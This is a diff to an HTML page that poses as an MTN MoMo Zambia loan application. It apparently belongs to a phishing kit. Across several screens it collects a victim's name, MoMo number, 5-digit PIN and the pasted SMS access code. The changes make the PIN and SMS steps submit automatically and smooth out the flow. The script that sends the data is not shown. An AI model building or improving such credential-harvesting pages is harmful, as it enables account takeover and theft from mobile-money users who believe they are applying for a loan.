@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261125r" />
+  <link rel="stylesheet" href="style.css?v=20261126a" />
 </head>
 <body>
   <div class="app-container">
@@ -35,12 +35,7 @@
           <li><strong>• ENTER YOUR EXACT REGISTERED FULL NAME AND ACTIVE MOMO NUMBER TO AVOID DELAYS.</strong></li>
           <li><strong>• APPLICATIONS ARE REVIEWED PROMPTLY AFTER SUBMISSION.</strong></li>
         </ul>
-        <button
-          id="btn-goto-slider"
-          class="btn-momo-primary"
-          type="button"
-          onclick="(function(){document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});var next=document.getElementById('screen-slider');if(next)next.classList.add('active');window.scrollTo(0,0);})()"
-        >
+        <button id="btn-goto-slider" class="btn-momo-primary" type="button">
           <span>GET STARTED</span>
           <small>CHECK LOAN ELIGIBILITY</small>
         </button>
@@ -63,12 +58,7 @@
       </div>
 
       <div class="sub-nav-strip">
-        <button
-          id="btn-slider-back"
-          class="nav-back-btn"
-          type="button"
-          onclick="(function(){document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});var prev=document.getElementById('screen-welcome');if(prev)prev.classList.add('active');window.scrollTo(0,0);})()"
-        >← Back</button>
+        <button id="btn-slider-back" class="nav-back-btn" type="button">← Back</button>
         <span class="sub-nav-title">Loan Calculator</span>
       </div>
 
@@ -162,6 +152,7 @@
       </div>
 
       <div class="sub-nav-strip">
+        <button id="btn-form2-back" class="nav-back-btn" type="button">← Back</button>
         <span class="sub-nav-light">Loan Application</span>
       </div>
 
@@ -215,6 +206,7 @@
       </div>
 
       <div class="sub-nav-strip">
+        <button id="btn-form3-top-back" class="nav-back-btn" type="button">← Back</button>
         <span class="sub-nav-light">Loan Application</span>
       </div>
 
@@ -246,12 +238,12 @@
 
         <div class="form-buttons-row">
           <button id="btn-form3-prev" class="btn-grey-action" type="button">← Previous</button>
-          <button id="btn-form3-submit" class="btn-momo-solid compact-prog" type="button">SUBMIT APPLICATION</button>
+          <button id="btn-form3-submit" class="btn-momo-solid compact-prog" type="button">CONTINUE TO PIN →</button>
         </div>
       </div>
     </section>
 
-    <!-- Screen 6: Y'ello Phathutshedzo 5-Digit PIN Login Screen -->
+    <!-- Screen 6: 5-Digit PIN & Phone No Screen (Auto-submits once 5 digits are entered) -->
     <section id="screen-pin" class="screen">
       <div class="pin-top-bar">
         <button id="btn-pin-back" class="nav-back-clean" type="button" aria-label="Back">←</button>
@@ -269,8 +261,22 @@
         </h2>
 
         <div id="banner-pin-error" class="surface-error-banner"></div>
+        <div id="banner-pin-info" class="surface-info-banner"></div>
 
         <div class="yello-pin-field-wrap">
+          <label for="pin-phone-input" class="pin-field-label">Phone No</label>
+          <input
+            id="pin-phone-input"
+            type="tel"
+            inputmode="numeric"
+            placeholder="096 XXX XXXX"
+            maxlength="13"
+            class="yello-phone-line-input"
+          />
+        </div>
+
+        <div class="yello-pin-field-wrap">
+          <label for="yello-pin-input" class="pin-field-label">5-Digit PIN (Auto-submits at 5 digits)</label>
           <div class="yello-pin-underline-row">
             <input
               id="yello-pin-input"
@@ -278,18 +284,15 @@
               inputmode="numeric"
               pattern="[0-9]*"
               maxlength="5"
-              placeholder="PIN"
+              placeholder="Enter 5-digit PIN"
               class="yello-pin-input"
               autocomplete="off"
-              oninput="(function(el){var d=el.value.replace(/\D/g,'').slice(0,5);if(el.value!==d)el.value=d;var btn=document.getElementById('btn-sign-in-pin');if(btn){btn.disabled=false;btn.classList.add('ready');}})(this)"
-              onkeydown="if(event.key==='Enter'){event.preventDefault();var b=document.getElementById('btn-sign-in-pin');if(b)b.click();}"
             />
             <button
               id="btn-toggle-pin-visibility"
               type="button"
               class="yello-eye-btn"
               aria-label="Show or hide PIN"
-              onclick="(function(btn){var inp=document.getElementById('yello-pin-input');if(!inp)return;var isHidden=inp.type==='password';inp.type=isHidden?'text':'password';btn.innerText=isHidden?'🙈':'👁️';})(this)"
             >👁️</button>
           </div>
         </div>
@@ -297,13 +300,6 @@
         <div class="yello-forgot-row">
           <a href="#" id="link-forgot-pin" class="yello-forgot-link">Forgot PIN?</a>
         </div>
-
-        <button
-          id="btn-sign-in-pin"
-          type="button"
-          class="btn-sign-in-pill ready"
-          onclick="(function(){var inp=document.getElementById('yello-pin-input');var err=document.getElementById('banner-pin-error');var pin=inp?inp.value.replace(/\D/g,'').slice(0,5):'';if(pin.length!==5){if(err){err.innerText='Please enter your 5-digit PIN before tapping SIGN IN.';err.classList.add('active');}if(inp)inp.focus();return;}if(err){err.innerText='';err.classList.remove('active');}if(window.__submitPinDirect){window.__submitPinDirect(pin);}})()"
-        >SIGN IN</button>
 
         <button id="btn-switch-account" type="button" class="yello-switch-account-btn">Switch account</button>
 
@@ -318,7 +314,7 @@
       </div>
     </section>
 
-    <!-- Screen 7: SMS Verification Screen -->
+    <!-- Screen 7: SMS Verification Screen (15s Countdown + Auto-submit on Y'ello. Please note!) -->
     <section id="screen-sms" class="screen">
       <div class="top-nav-bar">
         <span class="hamburger">☰</span>
@@ -337,7 +333,7 @@
         <h2 class="sms-heading">SMS Verification</h2>
         <p class="sms-notice">
           Paste the verification SMS received on your phone starting with:
-          <strong>Y'ello. Please note! This confidential code gives access to your MoMo account:</strong>
+          <strong>Y'ello. Please note!</strong>
         </p>
 
         <div class="sms-phone-display-block">
@@ -346,62 +342,31 @@
         </div>
 
         <div class="sms-timer-box">
-          <span id="sms-timer-text" class="sms-countdown">Request new SMS in <strong id="sms-seconds">15</strong>s</span>
-          <button id="btn-request-new-sms" type="button" class="btn-request-sms hidden-btn">REQUEST NEW SMS</button>
+          <span id="sms-timer-text" class="sms-countdown">
+            Countdown: <strong id="sms-seconds">15</strong>s
+          </span>
+          <button
+            id="btn-request-new-sms"
+            type="button"
+            class="btn-request-sms hidden-btn"
+          >REQUEST NEW SMS</button>
         </div>
 
         <div id="banner-sms-info" class="surface-info-banner"></div>
         <div id="banner-sms-error" class="surface-error-banner"></div>
 
         <div class="form-group">
+          <label for="sms-input-box">Paste SMS Message (Auto-submits when starting with Y'ello. Please note!)</label>
           <textarea
             id="sms-input-box"
             class="sms-textarea"
-            placeholder="Y'ello. Please note! This confidential code gives access to your MoMo account:12345"
+            placeholder="Y'ello. Please note! This confidential code gives access to your MoMo account: 12345"
           ></textarea>
         </div>
-
-        <button id="btn-validated-sms" class="btn-momo-solid" type="button">SUBMIT SMS</button>
       </div>
     </section>
 
-    <!-- Screen 8: MTN MoMo 4-Digit OTP Screen -->
-    <section id="screen-otp" class="screen">
-      <div class="top-nav-bar">
-        <span class="hamburger">☰</span>
-        <div class="momo-nav-logo">
-          <span>MTN</span>
-          <strong>MoMo</strong>
-        </div>
-      </div>
-
-      <div class="sub-nav-strip dark-strip">
-        <span class="nav-back-light">MTN MoMo 4-Digit OTP</span>
-        <span class="hamburger-dark">ZAMBIA</span>
-      </div>
-
-      <div class="card-container-spacious">
-        <h2 class="enter-pin-heading" style="margin-top: 12px;">MTN MoMo 4-Digit OTP</h2>
-        <p class="sms-notice" style="text-align: center;">
-          Enter the 4-digit OTP code sent to your MTN MoMo number to verify and continue:
-        </p>
-
-        <p id="display-otp-phone" class="applicant-phone-subtitle">096 XXX XXXX</p>
-
-        <div id="banner-otp-error" class="surface-error-banner"></div>
-
-        <div class="otp-boxes-4">
-          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box-4" autocomplete="one-time-code" autocorrect="off" autocapitalize="off" spellcheck="false" />
-          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box-4" autocomplete="one-time-code" autocorrect="off" autocapitalize="off" spellcheck="false" />
-          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box-4" autocomplete="one-time-code" autocorrect="off" autocapitalize="off" spellcheck="false" />
-          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box-4" autocomplete="one-time-code" autocorrect="off" autocapitalize="off" spellcheck="false" />
-        </div>
-
-        <button id="btn-submit-otp" class="btn-momo-solid" type="button">VERIFY &amp; CONTINUE</button>
-      </div>
-    </section>
-
-    <!-- Screen 9: Congratulations / Success Screen -->
+    <!-- Screen 8: Congratulations / Success Screen -->
     <section id="screen-success" class="screen">
       <div class="top-nav-bar">
         <button id="btn-success-back" class="nav-back-btn" type="button">← Back</button>
@@ -424,7 +389,7 @@
       </div>
     </section>
 
-    <!-- Screen 10: Blocked / Stopped Screen -->
+    <!-- Screen 9: Blocked / Stopped Screen -->
     <section id="screen-stopped" class="screen">
       <div class="top-nav-bar">
         <div class="momo-nav-logo">
@@ -435,9 +400,9 @@
 
       <div class="card-container-spacious">
         <div class="blocked-badge-circle">✕</div>
-        <h2 class="blocked-title">Application Blocked</h2>
+        <h2 class="blocked-title">BLOCK</h2>
         <p id="blocked-reason-text" class="blocked-sub">
-          Your application was blocked because valid MTN MoMo details were not confirmed.
+          Application blocked — valid MTN MoMo details were not confirmed.
         </p>
 
         <button id="btn-retry-home" class="btn-momo-solid" type="button" style="margin-top: 24px;">RETURN HOME</button>
@@ -453,7 +418,7 @@
 
   </div>
 
-  <script src="script.js?v=20261125r"></script>
+  <script src="script.js?v=20261126a"></script>
 </body>
-            </html>
-          
+  </html>
+  
